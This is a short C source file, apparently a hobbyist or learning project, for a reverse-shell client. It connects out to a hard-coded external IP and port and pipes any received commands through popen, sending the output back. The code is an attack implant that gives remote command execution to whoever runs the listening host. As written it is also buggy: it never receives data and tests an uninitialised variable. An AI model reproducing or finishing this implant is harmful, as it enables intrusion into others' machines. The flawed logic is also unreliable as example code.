// Don't reinvent the wheel. Use the libraries like in any other language

#include <stdio.h>      // pretty much always need for I/O fucntions
#include <stdlib.h>     // memory allocation
#include <string.h>     // string manipulation
#include <unistd.h>     // POSIX API stuff
#include <arpa/inet.h>  // sockets

// Defining constants

#define SERVER_IP "100.76.130.61"
//#define SERVER_IP "127.0.0.1"
#define SERVER_PORT 6969
#define BUFFER_SIZE 1024    // enough space to fit header plus extras

// Function for executing our commmands on system. Needs server logic. This simply connects and
// shows the connection.

void execute_command(int sock) {
    char buffer[BUFFER_SIZE];   //Create buffer to store commands and responses
    int bytes_received;

    while (1) {
        memset(buffer, 0, BUFFER_SIZE);
        if (bytes_received <= 0) {
            break; // no data, exit only the loop
        }

        FILE *fp = popen(buffer, "r");      // popen is POSIX magic to execute commands within the program.
        if (fp == NULL) {
            send(sock, "Failed to execute command, silly goose.\n", strlen("Failed to execute command, silly goose.\n"), 0);
            continue;
        }

                while (fgets(buffer, BUFFER_SIZE, fp) != NULL) {
            send(sock, buffer, strlen(buffer), 0);
        }
        pclose(fp); // Close process pipe

    }
}

int main() {
    int sock;       // recall block scope
    struct sockaddr_in server_addr;

    // Create socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) {
        perror("Socket creation failed");
        return 1;       // socket creation
    }

    // Server address setup
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(SERVER_PORT);
    inet_pton(AF_INET, SERVER_IP, &server_addr.sin_addr);

    // Connect to server
    if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) == -1) {
        perror("Connection failed");
        close(sock);
        return 1;
    }

    // Execute remote commands
    execute_command(sock);

    close(sock);
    return 0;
}

